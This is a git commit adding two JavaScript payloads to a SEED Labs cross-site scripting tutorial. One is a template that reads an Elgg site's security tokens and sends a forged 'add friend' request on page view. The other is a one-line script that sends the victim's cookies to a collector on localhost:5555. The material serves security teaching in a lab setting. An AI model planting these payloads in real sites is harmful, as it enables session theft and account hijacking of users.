ef0f9da076ea3f39460136ff0e4f073feb2c3a6e
cappetta <thomas.cappetta@gmail.com>
2019-11-16 16:56:23 -0500

    updating labs

---
+++ tutorials/seed/lab6-xss/xss-become-a-friend-on-view.js
@@ -0,0 +1,18 @@
+xss-become-a-friend-on-view.js
+
+<script type="text/javascript">
+window.onload = function () {
+var Ajax=null;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+//Construct the HTTP request to add Samy as a friend.
+var sendurl=...; //FILL IN
+//Create and send Ajax request to add friend
+Ajax=new XMLHttpRequest();
+Ajax.open("GET",sendurl,true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+Ajax.send();
+}
+</script>
---
+++ tutorials/seed/lab6-xss/xss-to-rce.js
@@ -0,0 +1,3 @@
+
+
+<p><script>document.write('<img src=http://localhost:5555?c='+ escape(document.cookie) + '>');</script></p>
